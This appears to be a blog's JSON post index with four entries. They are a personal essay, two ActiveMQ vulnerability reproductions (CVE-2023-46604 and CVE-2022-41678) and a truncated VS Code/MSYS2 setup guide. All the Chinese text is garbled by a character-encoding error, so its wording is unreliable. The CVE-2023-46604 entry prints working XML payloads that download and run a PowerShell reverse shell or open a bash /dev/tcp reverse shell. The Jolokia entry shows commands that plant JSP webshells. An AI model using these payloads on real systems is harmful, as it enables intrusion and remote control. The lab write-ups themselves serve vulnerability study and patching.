[{"content":" äººçš„çœ¼é‡Œä¸æ˜¯ä½  ä½ çœ¼é‡Œçš„è‡ªå·±ä¹Ÿä¸æ˜¯ä½  ä½ çœ¼ä¸­çš„åˆ«äººæ‰æ˜¯ä½  â€”â€”â€” å¦‚è±å¤§boss\nå›æƒ³ä¹‹å‰çš„ç§ç§ï¼Œæˆ‘ä¸€ç›´åœç•™åœ¨â€œæ²¡å‡†å¤‡å¥½ï¼Œå…‰æƒ³ä¸åšâ€çš„é˜¶æ®µï¼Œè™½ç„¶æˆ‘å¾ˆå¥½åœ°éšè—å¹¶å…‹åˆ¶äº†é€šè¿‡åˆ«äººå˜´é‡Œäº†è§£è‡ªå·±ï¼Œä½†è¿˜æ˜¯å‡ºç°äº†è‡ªæˆ‘çŸ›ç›¾ä¸ç²¾ç¥å†…è€—ï¼Œé‚£äº›æ¸…é†’ä¸æ²‰æººçš„å¯¹æŠ—ï¼Œè®©æˆ‘çš„è„‘å­å¼€å§‹ä¸åœåœ°ç©ºè½¬ã€‚\næ°å¥½é‚£æ˜¯ä¸€æ®µç‹¬å¤„çš„æ—¶é—´ï¼Œæˆ‘å¼€å§‹é˜…è¯»ï¼Œå¤ç›˜ç”Ÿæ´»ä¸­å‘ç”Ÿçš„äº‹ï¼Œç¢ç£¨é‡Œé¢çš„å¼¯å¼¯ç»•ç»•ã€‚ä¸€å¼€å§‹åªæ˜¯æ‰“å‘æ—¶é—´ï¼Œæƒ³è®©è„‘å­æœ‰ä¸ªä¸»é¢˜è€Œä¸æ˜¯çè½¬ï¼Œæ…¢æ…¢åœ°ï¼Œæˆ‘å–œæ¬¢ä¸Šäº†è¿™ç§ç¬¬ä¸‰æ–¹è§†è§’çš„æ„Ÿè§‰ã€‚\nè¿™ç§æ€ªå¼‚çš„æŠ½ç¦»æ„Ÿå¾—ä»¥è®©æˆ‘çŸ­æš‚æ‘†è„±å†…è€—ï¼Œä½†å§‹ç»ˆæ˜¯æ²»æ ‡ä¸æ²»æœ¬ã€‚\nç”±äºæ€æƒ³è®¤çŸ¥çš„ä¸è¶³ï¼Œæˆ‘æ²¡æœ‰æ–¹å‘ï¼Œä¸çŸ¥é“æ€ä¹ˆæå‡ã€‚æˆ‘å‘Šè¯‰è‡ªå·±è¦â€œçŸ¥è¡Œåˆä¸€â€ï¼Œå¿ƒå¢ƒå´å§‹ç»ˆå·®é‚£ä¹ˆä¸€ç‚¹æ„æ€ã€‚\nåœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä¸çŸ¥é“â€œå†…è§‚â€æ˜¯ä»€ä¹ˆï¼Œä¹Ÿä¸çŸ¥é“â€œå†…è§‚â€ç©¶ç«Ÿæ„å‘³ç€ä»€ä¹ˆã€‚\nå†…è§‚ï¼Œæˆ–è€…è¯´è‡ªæˆ‘åçœï¼Œæ˜¯ä¸€ç§æ·±åº¦å®¡è§†è‡ªå·±å†…å¿ƒçš„æ–¹å¼ã€‚å®ƒå¸®åŠ©æˆ‘ä»¬å‰¥ç¦»è¡¨è±¡ï¼Œç›´é¢å†…å¿ƒæ·±å¤„çš„ææƒ§å’Œä¸è¶³ã€‚è¿™ä¸ªè¿‡ç¨‹è™½ç—›è‹¦ï¼Œä½†å´æ˜¯æˆé•¿å’Œè‡ªæˆ‘æå‡çš„é‡è¦é€”å¾„ã€‚\nä»Šå¤©é‡è§è¿™æ®µè¯ï¼Œç»™æˆ‘ä¸€ç§ç‚¹é†’æ¢¦ä¸­äººçš„å®¿å‘½æ„Ÿã€‚åå¤å’€åš¼è¿™å¥è¯ï¼Œæˆ‘æ˜ç™½äº†ï¼Œé‚£äº›æ··æ²Œæ„Ÿå¥½åƒæ˜¯åœ¨å»ºç«‹å†…è§‚ã€‚å°±åƒå‰¥æ´‹è‘±ä¸€æ ·ï¼Œä¸€å±‚ä¸€å±‚åœ°å‰¥å¼€å†…å¿ƒä¸æ•¢ç›´è§†çš„é»‘æš—ï¼Œä¸åœåœ°æ’•å¼€è‡ªå·±çš„é¢å…·å’Œé®ç¾å¸ƒã€‚åŸæ¥è¿™å°±æ˜¯å†…è§‚çš„è¿‡ç¨‹ï¼Œæ¶ˆé™¤ææƒ§ï¼Œæ‰¿è®¤ä¸è¶³ï¼Œç ´è€Œåç«‹ã€‚\næ‰€ä»¥å†…è€—ï¼Œè¯´åˆ°åº•ï¼Œä¸æ˜¯å¤–ç•Œçš„ä¸œè¥¿åœ¨ä¼¤å®³ä½ ï¼Œè€Œæ˜¯ä½ è‡ªå·±åœ¨ä¼¤å®³è‡ªå·±ã€‚é€šè¿‡å†…è§‚è¿›è¡Œä¸»ä½“æ€§çš„å»ºç«‹ï¼Œæ¶ˆé™¤å®¢ä½“åŒ–ï¼Œå°±èƒ½èµ°å‡ºç²¾ç¥å†…è€—ã€‚\né€šè¿‡æŠ•å°„æ•ˆåº”ï¼Œå¯ä»¥æ˜ç™½äº‹å®å’Œçœ‹æ³•æ˜¯ä¸¤ç äº‹ï¼Œå†³å®šäººå¿ƒç†çŠ¶æ€çš„ä¸æ˜¯äº‹å®æœ¬èº«ï¼Œè€Œæ˜¯å¯¹äº‹å®çš„çœ‹æ³•ã€‚\nä¸€ä¸ªå¾ˆè€çš„ä¾‹å­ï¼Œæ¡Œä¸ŠåŠç“¶æ°´æ˜¯ä¸ªäº‹å®ï¼Œä½†åŒä¸€ä¸ªäº‹å®ä¼šäº§ç”Ÿæ‚²è§‚å’Œä¹è§‚ä¸¤ç§äººï¼Œè¿™å°±æ˜¯ç”±äººä»¬çš„çœ‹æ³•å†³å®šçš„ã€‚\nä»»ä½•ä¸€ä»¶äº‹æ°¸è¿œå¯ä»¥ä»ä¹è§‚çš„ç§¯æçš„æ–¹é¢å»çœ‹å¾…ï¼Œè¿™å°±å«æˆé•¿å‹æ€ç»´ã€‚å»ºç«‹ä¸»ä½“æ€§ï¼Œç”¨æˆé•¿å‹æ€ç»´çœ‹å¾…ç”Ÿæ´»ï¼Œæ‰ä¼šä¸€è·¯å¼€æŒ‚ä¸‹å»ã€‚\né™„å½• å‚è€ƒæ–‡çŒ® ã€Šå†™çš„å†…å®¹è¶Šæ¥è¶Šé•¿äº†ï¼Œç´ æéƒ½æ— å…³ç´§è¦çš„æ‹¼ç€çœ‹å§#ç”»å®¤æ—¥å¸¸ #æ²¹ç”» #å†…è€— - æŠ–éŸ³ (douyin.com)ã€‹\nç‰ˆæƒä¿¡æ¯ æœ¬æ–‡åŸè½½äº Ranch\u0026rsquo;s Blogï¼Œéµå¾ª CC BY-NC-SA 4.0 åè®®ï¼Œå¤åˆ¶è¯·ä¿ç•™åŸæ–‡å‡ºå¤„ã€‚\n","date":"2024-11-11T18:30:21+08:00","image":"http://ranch007.github.io/p/%E6%9C%89%E7%A7%8D%E4%B8%80%E8%AF%AD%E6%83%8A%E9%86%92%E6%A2%A6%E4%B8%AD%E4%BA%BA%E7%9A%84%E5%AE%BF%E5%91%BD%E6%84%9F/boss3332_hu18266413526380578093.png","permalink":"http://ranch007.github.io/p/%E6%9C%89%E7%A7%8D%E4%B8%80%E8%AF%AD%E6%83%8A%E9%86%92%E6%A2%A6%E4%B8%AD%E4%BA%BA%E7%9A%84%E5%AE%BF%E5%91%BD%E6%84%9F/","title":"æœ‰ç§ä¸€è¯­æƒŠé†’æ¢¦ä¸­äººçš„å®¿å‘½æ„Ÿ"},{"content":" Apache ActiveMQ æ˜¯ç¾å›½é˜¿å¸•å¥‡ï¼ˆApacheï¼‰è½¯ä»¶åŸºé‡‘ä¼šæ‰€ç ”å‘çš„ä¸€å¥—å¼€æºçš„æ¶ˆæ¯ä¸­é—´ä»¶ï¼Œå®ƒæ”¯æŒJavaæ¶ˆæ¯æœåŠ¡ã€é›†ç¾¤ã€Spring Frameworkç­‰ã€‚\nOpenWireåè®®åœ¨ActiveMQä¸­è¢«ç”¨äºå¤šè¯­è¨€å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡ã€‚åœ¨Apache ActiveMQ 5.18.2ç‰ˆæœ¬åŠä»¥å‰ï¼ŒOpenWireåè®®é€šä¿¡è¿‡ç¨‹ä¸­å­˜åœ¨ä¸€å¤„ååºåˆ—åŒ–æ¼æ´ï¼Œè¯¥æ¼æ´å¯ä»¥å…è®¸å…·æœ‰ç½‘ç»œè®¿é—®æƒé™çš„è¿œç¨‹æ”»å‡»è€…é€šè¿‡æ“ä½œ OpenWire åè®®ä¸­çš„åºåˆ—åŒ–ç±»ç±»å‹ï¼Œå¯¼è‡´ä»£ç†çš„ç±»è·¯å¾„ä¸Šçš„ä»»ä½•ç±»å®ä¾‹åŒ–ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚\nå½±å“èŒƒå›´ Apache ActiveMQ â‰¤ 5.18.2 Apache ActiveMQ ï¼œ5.17.6 Apache ActiveMQ ï¼œ5.16.7 Apache ActiveMQ ï¼œ5.15.16 ç¯å¢ƒæ„å»º ActiveMQè¿è¡Œåï¼Œé»˜è®¤ç›‘å¬å¦‚ä¸‹ä¸¤ä¸ªç«¯å£ï¼š\né»˜è®¤ç«¯å£ é»˜è®¤æ¡ä»¶ 8161 web éœ€é…ç½®æ‰å¯è¿œç¨‹è®¿é—® 61616 tcp è¿œç¨‹è®¿é—® ååºåˆ—åŒ–æ¼æ´å‡ºç°åœ¨61616ç«¯å£ä¸­ã€‚ æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯åŠ¨ä¸€ä¸ªActiveMQ 5.17.3ç‰ˆæœ¬æœåŠ¡å™¨ï¼š\n1 docker compose up -d åœ¨åˆ©ç”¨ä¹‹å‰è¯·è®¿é—®http://your-ip:8161ä»¥ç¡®è®¤æœåŠ¡å·²æˆåŠŸå¯åŠ¨ï¼Œåç»­åªéœ€è¦ä½¿ç”¨ç«¯å£ 61616ã€‚\nåŸç†åˆ†æ åˆ†ææ¥è‡ªäºã€ŠApache ActiveMQ CVE-2023-46604 RCE åˆ†æâ€”â€”Boogipopã€‹\nè¿™è¾¹çš„diffå¯ä»¥çœ‹åˆ°ï¼Œæ¼æ´ç‚¹åœ¨BaseDataStreamMarshallerçš„createThrowableæ–¹æ³•ã€‚\nActiveMQ Classic ä»£ç†é™„å¸¦äº†ä¸€äº› Spring ä¾èµ–é¡¹ï¼ŒåŒ…æ‹¬org.springframework.context.support.ClassPathXmlApplicationContextç”¨äºè¿è¡Œ Spring åº”ç”¨ç¨‹åºçš„ä¾èµ–é¡¹ã€‚æ­¤ç±»ä¸ä»…å­˜åœ¨äºä»£ç†ä¸­ï¼Œè€Œä¸”è¿˜æ˜¯æä¸ºå¸¸è§çš„å®¢æˆ·ç«¯ä¾èµ–é¡¹ã€‚å®ƒæœ‰ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œè¯¥æ„é€ å‡½æ•°æ¥å—ä¸€ä¸ªStringï¼Œè¯¥æ„é€ å‡½æ•°å¯ä»¥æ˜¯æŒ‡å‘ç½‘ç»œä¸Šçš„ XML åº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶çš„ HTTP URLã€‚\næ­¤æ¼æ´çš„å”¯ä¸€å·²çŸ¥åˆ©ç”¨æ–¹æ³•æ˜¯ClassPathXmlApplicationContexté€šè¿‡ HTTP ä»ç½‘ç»œæŸå¤„åŠ è½½æ¶æ„ XML åº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ã€‚æ­¤æ¶æ„ XML æ˜ç¡®å®šä¹‰äº†è¦åœ¨å­˜åœ¨æ¼æ´çš„æœºå™¨ï¼ˆå³ä»£ç†æˆ–å®¢æˆ·ç«¯ï¼‰ä¸Šè¿è¡Œçš„ä»»æ„ä»£ç ã€‚\næ¼æ´å¤ç° é¦–å…ˆï¼Œå¯åŠ¨ä¸€ä¸ªHTTPåè¿æœåŠ¡å™¨ï¼Œå…¶ä¸­åŒ…å«æˆ‘ä»¬çš„ã€poc.xmlã€‘ï¼š\n1 python3 -m http.server 6666 ç„¶åï¼Œæ‰§è¡Œã€poc.pyã€‘ï¼Œä¼ å…¥çš„ä¸‰ä¸ªå‚æ•°åˆ†åˆ«æ˜¯ç›®æ ‡æœåŠ¡å™¨åœ°å€ã€ç«¯å£ï¼Œä»¥åŠåŒ…å«poc.xml çš„åè¿å¹³å°URLï¼š\n1 python poc.py rhost rport http://vps:port/poc.xml æ‰§è¡Œå®Œæˆåï¼Œè¿›å…¥ActiveMQå®¹å™¨ï¼š\n1 docker exec cve-2023-46604-activemq-1 ls -l /tmp å¯ä»¥çœ‹è§å‘½ä»¤touch /tmp/activeMQ-RCE-success å·²ç»è¢«æˆåŠŸæ‰§è¡Œã€‚\nã€POC-DNSLogã€‘\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;pb\u0026#34; class=\u0026#34;java.lang.ProcessBuilder\u0026#34; init-method=\u0026#34;start\u0026#34;\u0026gt; \u0026lt;constructor-arg\u0026gt; \u0026lt;list\u0026gt; \u0026lt;value\u0026gt;ping\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;xxx.xxx.xxx.cn\u0026lt;/value\u0026gt; \u0026lt;/list\u0026gt; \u0026lt;/constructor-arg\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; ã€POC-winã€‘\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;pb\u0026#34; class=\u0026#34;java.lang.ProcessBuilder\u0026#34; init-method=\u0026#34;start\u0026#34;\u0026gt; \u0026lt;constructor-arg\u0026gt; \u0026lt;list\u0026gt; \u0026lt;value\u0026gt;powershell\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;-c\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;\u0026lt;![CDATA[IEX (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\u0026#39;); Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -Port 3333]]\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/list\u0026gt; \u0026lt;/constructor-arg\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; ã€POC-linuxã€‘\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;pb\u0026#34; class=\u0026#34;java.lang.ProcessBuilder\u0026#34; init-method=\u0026#34;start\u0026#34;\u0026gt; \u0026lt;constructor-arg \u0026gt; \u0026lt;list\u0026gt; \u0026lt;value\u0026gt;bash\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;-c\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;\u0026lt;![CDATA[bash -i \u0026gt;\u0026amp; /dev/tcp/ip/port 0\u0026gt;\u0026amp;1]]\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/list\u0026gt; \u0026lt;/constructor-arg\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; ä¿®å¤å»ºè®® å»ºè®®æ›´æ–°åˆ°æœ€æ–°å®‰å…¨ç‰ˆæœ¬\nApache ActiveMQ â‰¥ 5.18.3 Apache ActiveMQ â‰¥ 5.17.6 Apache ActiveMQ â‰¥ 5.16.7 Apache ActiveMQ â‰¥ 5.15.16 é™„å½• å‚è€ƒæ–‡çŒ® ã€ŠApache ActiveMQ RCE åˆ†æã€‹\nã€ŠApache ActiveMQ CVE-2023-46604 RCE åˆ†æâ€”â€”Boogipopã€‹\nã€ŠAchieving a Reverse Shell Exploit for Apache ActiveMQ (CVE_2023-46604)ã€‹\nã€ŠActiveMQ RCE ï¼ˆCVE-2023-46604ï¼‰ æ¼æ´åˆ©ç”¨å·¥å…·ã€‹\nç‰ˆæƒä¿¡æ¯ æœ¬æ–‡åŸè½½äº Ranch\u0026rsquo;s Blogï¼Œéµå¾ª CC BY-NC-SA 4.0 åè®®ï¼Œå¤åˆ¶è¯·ä¿ç•™åŸæ–‡å‡ºå¤„ã€‚\n","date":"2024-11-10T19:40:36+08:00","image":"http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/activemq_hu8434215637875122635.png","permalink":"http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/","title":"Apache ActiveMQ OpenWire åè®®ååºåˆ—åŒ– RCEï¼ˆCVE 2023 46604ï¼‰"},{"content":" Apache ActiveMQ æ˜¯ç¾å›½é˜¿å¸•å¥‡ï¼ˆApacheï¼‰è½¯ä»¶åŸºé‡‘ä¼šæ‰€ç ”å‘çš„ä¸€å¥—å¼€æºçš„æ¶ˆæ¯ä¸­é—´ä»¶ï¼Œå®ƒæ”¯æŒJavaæ¶ˆæ¯æœåŠ¡ã€é›†ç¾¤ã€Spring Frameworkç­‰ã€‚\nActiveMQä¸­ï¼Œç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·é»˜è®¤æƒ…å†µä¸‹å¯ä»¥é€šè¿‡/api/jolokia/æ¥å£æ“ä½œMBeanï¼Œå…¶ä¸­FlightRecorderå¯ä»¥è¢«ç”¨äºå†™Jsp WebShellï¼Œä»è€Œé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚\nFlightRecorderå­˜åœ¨äºJdk 11+ï¼Œå…·ä½“ç±»åï¼šjdk.management.jfr.FlightRecorderMXBeanImpl\nå½±å“èŒƒå›´ Apache ActiveMQ before 5.16.6 Apache ActiveMQ 5.17.0 before 5.17.4 Apache ActiveMQ 5.18.0 unaffected Apache ActiveMQ 6.0.0 unaffected ç¯å¢ƒæ„å»º åœ¨CVE-2022-41678ç›®å½•ä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯åŠ¨ä¸€ä¸ªApache ActiveMQ 5.17.3æœåŠ¡å™¨ï¼š\n1 docker compose up -d æœåŠ¡å¯åŠ¨åï¼Œè®¿é—®http://your-ip:8161/åè¾“å…¥è´¦å·å¯†ç adminå’Œadminï¼Œå³å¯æˆåŠŸç™»å½•åå°ã€‚\nåŸç†åˆ†æ æ¼æ´å…¥å£åœ¨ã€ http://localhost:8161/api/jolokia/ã€‘ ï¼Œâš ï¸æ³¨æ„éœ€è¦å¸¦ä¸ŠOriginå¤´æ‰å¯ä»¥è®¿é—®\nä¸»è¦é—®é¢˜å‡ºåœ¨FlightRecorderè¿™ä¸ªMbeanï¼ŒåŠŸèƒ½æ˜¯è®°å½•å†…å­˜ï¼Œgcï¼Œè°ƒç”¨æ ˆç­‰ã€‚ æ¼æ´ç”¨åˆ°çš„æ–¹æ³•ä¸»è¦æ˜¯ä»¥ä¸‹å‡ ä¸ªï¼š\nnewRecordingï¼šæ–°å»ºè®°å½• setConfigurationï¼šæ›´æ”¹é…ç½® startRecordingï¼šå¼€å§‹å½•åˆ¶ stopRecordingï¼šç»“æŸå½•åˆ¶ copyToï¼šå¯¼å‡ºå½•åˆ¶æ–‡ä»¶ æ¼æ´æ€è·¯æ˜¯é€šè¿‡setConfigurationä¿®æ”¹é…ç½®ï¼ŒæŠŠä¸€äº›é”®åæ”¹æˆjspä»£ç ï¼Œè®°å½•çš„æ•°æ®å°±ä¼šåŒ…å«è¯¥jspä»£ç ï¼Œå½•åˆ¶å®Œæˆåï¼Œé€šè¿‡copyToå¯¼å‡ºåˆ°webç›®å½•å³å¯\nä»£ç ä½ç½®åœ¨ jdk.management.jfr.FlightRecorderMXBeanImpl#setConfiguration\næ¼æ´å¤ç° é¦–å…ˆï¼Œè®¿é—®/api/jolokia/listè¿™ä¸ªAPIå¯ä»¥æŸ¥çœ‹å½“å‰æœåŠ¡é‡Œæ‰€æœ‰çš„MBeansï¼š\n1 2 # æ³¨æ„éœ€è¦å¸¦ä¸ŠOriginå¤´æ‰å¯ä»¥è®¿é—® Origin:http://192.168.1.3 è¿™å…¶ä¸­æœ‰ä¸¤ä¸ªç‚¹å¯ä»¥è¢«ç”¨æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚\né€”å¾„ä¸€ ç¬¬ä¸€ä¸ªæ–¹æ³•æ˜¯ä½¿ç”¨org.apache.logging.log4j.core.jmx.LoggerContextAdminMBeanï¼Œè¿™æ˜¯ç”±Log4j2æä¾›çš„ä¸€ä¸ªMBeanã€‚\næ”»å‡»è€…ä½¿ç”¨è¿™ä¸ªMBeanä¸­çš„setConfigTextæ“ä½œå¯ä»¥æ›´æ”¹Log4jçš„é…ç½®ï¼Œè¿›è€Œå°†æ—¥å¿—æ–‡ä»¶å†™å…¥ä»»æ„ç›®å½•ä¸­ã€‚\nä½¿ç”¨ã€POCã€‘è„šæœ¬æ¥å¤ç°å®Œæ•´çš„è¿‡ç¨‹ï¼š\n1 pyhon poc.py -u admin -p admin http://your-ip:8161 Webshellè¢«å†™å…¥åœ¨/admin/shell.jspæ–‡ä»¶ä¸­ï¼š\nè¿™ä¸ªæ–¹æ³•å—åˆ°ActiveMQç‰ˆæœ¬çš„é™åˆ¶ï¼Œå› ä¸ºLog4j2æ˜¯åœ¨5.17.0ä¸­æ‰å¼•å…¥Apache ActiveMQã€‚\né€”å¾„äºŒ ç¬¬äºŒä¸ªå¯åˆ©ç”¨çš„Mbeanæ˜¯jdk.management.jfr.FlightRecorderMXBeanã€‚\nFlightRecorderæ˜¯åœ¨OpenJDK 11ä¸­å¼•å…¥çš„ç‰¹æ€§ï¼Œè¢«ç”¨äºè®°å½•Javaè™šæ‹Ÿæœºçš„è¿è¡Œäº‹ä»¶ã€‚åˆ©ç”¨è¿™ä¸ªåŠŸèƒ½ï¼Œæ”»å‡»è€…å¯ä»¥å°†äº‹ä»¶æ—¥å¿—å†™å…¥ä»»æ„æ–‡ä»¶ã€‚\nä½¿ç”¨ã€POCã€‘è„šæœ¬æ¥å¤ç°å®Œæ•´çš„è¿‡ç¨‹ï¼ˆä½¿ç”¨--exploitå‚æ•°æŒ‡å®šä½¿ç”¨çš„æ–¹æ³•ï¼‰ï¼š\n1 python poc.py -u admin -p admin --exploit jfr http://localhost:8161 Webshellè¢«å†™å…¥åœ¨/admin/shelljfr.jspæ–‡ä»¶ä¸­ï¼š\nä¿®å¤å»ºè®® AMQ-9201 - Update Jolokia default access configuration Â· apache/activemq@6120169\nGitHubï¼š https://github.com/apache/activemq/commit/6120169e5) é™„å½• å‚è€ƒæ–‡çŒ® ã€ŠApache ActiveMQ Jolokia è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2022-41678)åˆ†æã€‹ ã€ŠApache ActiveMQå†å²æ¼æ´å¤ç°åˆé›†ã€‹ ç‰ˆæƒä¿¡æ¯ æœ¬æ–‡åŸè½½äº Ranch\u0026rsquo;s Blogï¼Œéµå¾ª CC BY-NC-SA 4.0 åè®®ï¼Œå¤åˆ¶è¯·ä¿ç•™åŸæ–‡å‡ºå¤„ã€‚\n","date":"2024-11-10T19:11:16+08:00","image":"http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/activemq_hu8434215637875122635.png","permalink":"http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/","title":"Apache ActiveMQ Jolokia åå°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE 2022 41678ï¼‰"},{"content":" å‡†å¤‡å·¥ä½œ ä¸‹è½½ VS Code å®‰è£…åŒ… å®˜æ–¹ä¸‹è½½é“¾æ¥ï¼šã€Visual Studio Code - Code Editing. Redefinedã€‘\nä¸‹è½½ Msys2 Githubä¸‹è½½é“¾æ¥ï¼šã€msys2-installerã€‘\nå®‰è£…è½¯ä»¶ VSCodeUserSetup-x64.exe åŒå‡»è¿è¡ŒVSCodeUserSetup-x64-1.94.0.exeè¿è¡Œå®‰è£…ç¨‹åº msys2-x86_64.exe åŒå‡»msys2-x86_64-20240727.exeè¿è¡Œå®‰è£…ç¨‹åº å½“æŒ‰ä¸‹å®Œæˆä¹‹åï¼Œä¼šå¼¹å‡ºæ‰“å¼€ä¸€ä¸ª MSYS2 ç»ˆç«¯çª—å£ã€‚\nåœ¨æ­¤ç»ˆç«¯ä¸­ï¼Œé€šè¿‡è¾“å…¥ä»¥ä¸‹å‘½ä»¤å¹¶æŒ‰å›è½¦é”®ï¼Œå®‰è£… MinGW-w64 å·¥å…·é“¾ï¼š\n1 pacman -S --needed base-devel mingw-w64-ucrt-x86_64-toolchain å‡ºç°è¿™ä¸ªç•Œé¢ï¼Œç›´æ¥æŒ‰å›è½¦é”®ï¼Œé»˜è®¤æ¥å—æ‰€æœ‰çš„å®‰è£…åŒ…ã€‚\nå½“ç³»ç»Ÿæç¤ºæ˜¯å¦ç»§ç»­å®‰è£…æ—¶ï¼Œè¯·è¾“å…¥yå¹¶å›è½¦ã€‚\nå½“æ‰€æœ‰çš„åŒ…éƒ½å®‰è£…å¥½åï¼Œç›´æ¥å…³é—­ç»ˆç«¯ã€‚ æ‰“å¼€å®‰è£… MSYS2 çš„ç›®å½•ï¼Œå…ˆæ‰¾åˆ°ucrt64æ–‡ä»¶å¤¹å¹¶è¿›å…¥ï¼Œå†æ‰¾åˆ°binæ–‡ä»¶å¤¹å¹¶è¿›å…¥ï¼Œç„¶ååœ¨åœ°å€æ ä¸­ï¼Œå¤åˆ¶è·¯å¾„ã€‚ å¦‚æœä¸€å¼€å§‹ç”¨é»˜è®¤è·¯å¾„ï¼Œé‚£è·¯å¾„å°±æ˜¯C:\\msys64\\ucrt64\\binã€‚\nç„¶ååœ¨æœç´¢æ¡†ä¸­è¾“å…¥ ç¼–è¾‘ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œå¹¶æ‰“å¼€ç¼–è¾‘ç³»ç»Ÿç¯å¢ƒå˜é‡çš„è®¾ç½®ç•Œé¢ã€‚\nåœ¨ç³»ç»Ÿå±æ€§çš„å¼¹çª—ä¸­ï¼Œç‚¹å‡»ç¯å¢ƒå˜é‡ã€‚\nåœ¨å¼¹å‡ºçš„ç¯å¢ƒå˜é‡å¼¹çª—ä¸­ï¼Œæ‰¾åˆ°ç”¨æˆ·å˜é‡çš„Pathï¼Œå¹¶åŒå‡»æ‰“å¼€ã€‚\næ­¤æ—¶ä¼šå¼¹å‡ºç¼–è¾‘ç¯å¢ƒå˜é‡çš„çª—å£ï¼Œå…ˆç‚¹å‡»æ–°å»ºæŒ‰é’®ï¼Œç„¶åä¼šåœ¨ç©ºç™½è¡Œä¸­å‡ºç°ä¸€ä¸ªè¾“å…¥æ¡†å’Œä¸€ä¸ªé—ªçƒçš„å…‰æ ‡ï¼Œåœ¨è¿™é‡Œç²˜è´´ä¸Šåˆšåˆšå¤åˆ¶çš„è·¯å¾„ï¼Œæœ€åç‚¹å‡»ç¡®å®šæŒ‰é’®å›åˆ°ä¸Šå±‚å¼¹çª—ã€‚\næœ€åï¼Œä¾æ¬¡ç‚¹å‡»å³ä¸‹è§’ç¡®å®šé€€å‡ºã€‚ æœ€ååšä¸€ä¸‹æµ‹è¯•ï¼ŒæŒ‰ç»„åˆé”®Win + rä¹‹åï¼Œè¾“å…¥cmdå›è½¦ã€‚\n1 2 3 gcc --version g++ --version gdb --version å®‰è£…VS Code æ‰©å±• æ±‰åŒ–æ‰©å±•åŒ…ï¼ˆå¯é€‰ï¼‰ C/C++ ç¯å¢ƒæ‰©å±•åŒ… æµ‹è¯• VS Code çš„ C/C++ ç¼–ç¨‹ç¯å¢ƒ åˆ›å»ºä»£ç æ–‡ä»¶å¤¹ VS Code æ˜¯ä¸€æ¬¾åŸºäºæ–‡ä»¶å¤¹è¿›è¡Œä»£ç ç¼–è¾‘å’Œç®¡ç†çš„ç¼–è¾‘å™¨ï¼Œé€šå¸¸æˆ‘ä»¬ä¼šæŠŠæ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹æ¥ç®¡ç†åŒä¸€ä¸ªé¡¹ç›®çš„ä»£ç ï¼Œå¹¶åœ¨ VS Code ä¸­æ‰“å¼€ã€‚\nå•ä¸ª .c æ–‡ä»¶çš„è¿è¡Œå’Œè°ƒè¯• 